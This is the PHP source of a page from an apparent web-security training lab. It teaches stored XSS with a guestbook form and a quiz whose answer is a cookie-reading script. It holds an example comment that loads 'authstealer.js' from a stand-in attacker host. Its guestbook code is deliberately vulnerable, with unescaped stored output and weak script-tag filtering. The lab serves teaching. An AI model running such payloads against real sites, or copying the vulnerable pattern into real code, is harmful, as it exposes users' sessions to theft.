<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>XSS Modules</title>
	<link href="modules.css" rel="stylesheet" type="text/css">
	<link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.0/jquery.min.js"></script>
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
</head>

<body>
<div id="container">
	<div id="header">
		<h1>WebsVEx Intermediate Level XSS DOM Attack</h1>
						<div id ="userinfo">
		<?php
		include('includes/dbsconnect.php');
		if(isset($_SESSION["username"])) {
		?>
		Welcome <?php echo $_SESSION["username"]; ?>.
		<br>
		Click here to <a href="logout.php" tite="Logout">Logout.</a>
		<?php
		}else echo "<a href='login.php'><h3>Please Login First</h3></a>";
		?>
	</div>
	</div>
	
	<div id="content">
		<div id="sidenav">
		<h2>Concept</h2>
			<h2>Concept</h2>
			<p>Stored XSS attack must have a perpetratorto locate a vulnerability in a web application and then inject malicious script into its server (e.g., via a comment field).One of the most frequent targets are websites that allow users to share content, including blogs, social networks, video sharing platforms and message boards. Every time the infected page is viewed, the malicious script is transmitted to the victim’s browser.</p>
			<p>The attacker attack with the following comment:</p>
			<pre><strong>Great price for a great item! Read my review here</strong><br>&lt;script&gt; src=”http://hackersite.com/authstealer.js”> &lt;/script &gt;</pre>
						<br>
			<p><strong>To download Tutorial & Guideline</strong></p>
			<p><a href="https://drive.google.com/open?id=1tU5eLO_Azw2eS6V_uWFxiE-RqsijbM7K">Tutorial</a></p>
		</div>

		
		
		<div id="main">
			<h3>Intermediate Level XSS DOM Attack</h3>
			<br />
			<h3>Objective</h3>
			<p>Get cookie on user logged in.</p>
			<form method="post">
			<p>What is script for finding cookie:
				<input type="text" size="15" name="passanswer">
				<input type="submit" name="Answer" value="Answer">
			</p>
				<?php
					if( isset( $_REQUEST[ 'Answer' ] ) ) {
							// Get Answer input
						$answerpass = $_REQUEST['passanswer'];
							if($answerpass == "<script>alert(document.cookie)</script>"){?>
								<p><strong>Congratulation,you found Alex's Password</strong></p>
								<input type="button" value="Next Page" class="AnswerButton" id="btnHome" onClick="location.href = 'storedintquiz.php';" />
								<?php
							}else echo "This is not script finding cookie";
							
						}
					?>
				</form>
				<br />
			<h3>Scenario</h3>
			<p>Low level will not check the requested input, before including it to be used in the output text.</p>
			<br>
			<div class="vulnerable_code_area">
				<form method="post" name="guestform" >
							<table width="550" border="0" cellpadding="2" cellspacing="1">
								<tr>
									<td width="100">Title*</td>
									<td><input name="txtName" type="text" size="30" maxlength="10"></td>
								</tr>
								<tr>
									<td width="100">Message *</td>
									<td><textarea name="mtxMessage" cols="50" rows="3" maxlength="50"></textarea></td>
								</tr>
								<tr>
									<td width="100">&nbsp;</td>
									<td>
										<input name="btnSign" type="submit" value="Post Comment" onclick="return validateGuestbookForm(this.form);" />
										<input name="btnClear" type="submit" value="Clear Comment" onClick="return confirmClearGuestbook();" />
									</td>
								</tr>
							</table>
				</form>
				<?php
				require_once "includes/dbsconnect.php";
				if( isset( $_POST[ 'btnSign' ] ) ) {
					// Get input
					$message = trim( $_POST[ 'mtxMessage' ] );
					$name    = trim( $_POST[ 'txtName' ] );

					// Sanitize message input
					$message = stripslashes( $message );
					$message = ((isset($conn) && is_object($conn)) ? mysqli_real_escape_string($conn,  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

					// Sanitize name input
					$name = str_replace( '<script>', '', $name );
					$name = ((isset($conn) && is_object($conn)) ? mysqli_real_escape_string($conn,  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

					// Update database
					$query  = "INSERT INTO stored ( comment, name ) VALUES ( '$message', '$name' );";
					$result = mysqli_query($conn,  $query ) or die( '<pre>' . ((is_object($conn)) ? mysqli_error($conn) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

					//mysql_close();
					}
				?>

	<br />

					<?php
					//Function for stored message
					  $query  = "SELECT name, comment FROM stored";
					  $result = mysqli_query($conn,  $query );

					  $message = '';

					  while( $row = mysqli_fetch_row( $result ) ) {
					      $name    = $row[0];
					      $comment = $row[1];

					   echo "<div id=\"guestbook_comments\">Name: {$name}<br />" . "Message: {$comment}<br /></div>\n";
					  }
					  return $message;
					// -- END (XSS Stored guestbook)
					?>
					
				
	</div>

	  </div>
	</div>
	
	<div id="footer">
		Copyrigh &copy; Websvex
	</div>
	</div>

</body>
</html>